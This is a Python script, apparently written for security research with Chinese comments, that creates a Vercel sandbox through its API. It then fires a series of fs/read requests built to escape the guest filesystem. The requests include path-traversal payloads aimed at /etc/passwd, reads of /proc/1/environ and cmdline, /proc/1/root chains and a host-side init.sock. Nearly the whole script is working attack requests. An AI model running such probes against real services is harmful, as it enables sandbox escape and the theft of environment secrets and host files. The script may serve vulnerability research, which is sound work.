# -*- coding: utf-8 -*-
"""独立根因候选3: fs/read cwd 路径解析语义 — 相对路径基准/穿越是否逃逸 guest fs
关键: 错误信息是否泄露解析后绝对路径(宿主侧实现特征); 相对 path 是否被允许"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

def log(s): print(s, flush=True)

def fs_read(sid, path, cwd=None, tag=''):
    body = {"path": path}
    if cwd is not None:
        body["cwd"] = cwd
    c, r = api('POST', '/v2/sandboxes/sessions/%s/fs/read?teamId=%s' % (sid, TEAM), body)
    content = r if isinstance(r, str) else str(r)
    log('[%s %-12s cwd=%-28s] http=%s len=%d | %s' % (tag, path, str(cwd), c, len(content), content[:260].replace(chr(10), ' ')))
    return c, content

# 建沙箱
c, r = api("POST", "/v2/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": "n4"})
if c != 200:
    log('create failed: %s' % r[:200]); sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
log('n4 sid: %s' % sid)
time.sleep(3)

# C1: 相对路径 + 根 cwd
fs_read(sid, 'etc/passwd', '/', 'C1')
# C2: 相对基准 /vercel/sandbox
fs_read(sid, 'etc/passwd', '/vercel/sandbox', 'C2')
# C3: cwd 下穿越回根
fs_read(sid, '../../../../etc/passwd', '/vercel/sandbox', 'C3')
# C4: 深度穿越逃逸
fs_read(sid, '../../../../../../../../etc/passwd', '/', 'C4')
# C5: 无前导斜杠相对
fs_read(sid, 'passwd', 'etc', 'C5')
# C6: proc 相对
fs_read(sid, 'environ', '/proc/1', 'C6')
# C7: proc root 链
fs_read(sid, '/proc/1/root/etc/passwd', None, 'C7')
# C8: 无效 cwd (文件当目录 / 不存在)
fs_read(sid, 'x', '/etc/passwd', 'C8')
fs_read(sid, 'x', '/nonexistent_dir', 'C8b')
# C9: cwd 空串
fs_read(sid, 'etc/passwd', '', 'C9')
# C10: cwd 为 guest 可读的敏感目录
fs_read(sid, 'init.sock', '/run/vercel/share', 'C10')
fs_read(sid, 'cmdline', '/proc/1', 'C10b')
# C11: 绝对路径 + cwd 组合 (cwd 是否被忽略)
fs_read(sid, '/etc/passwd', '/vercel/sandbox', 'C11')
# C12: 目录列表
fs_read(sid, '.', '/vercel/sandbox', 'C12')

api("DELETE", "/v2/sandboxes/n4?teamId=%s&projectId=%s" % (TEAM, PROJ))
log('DONE')
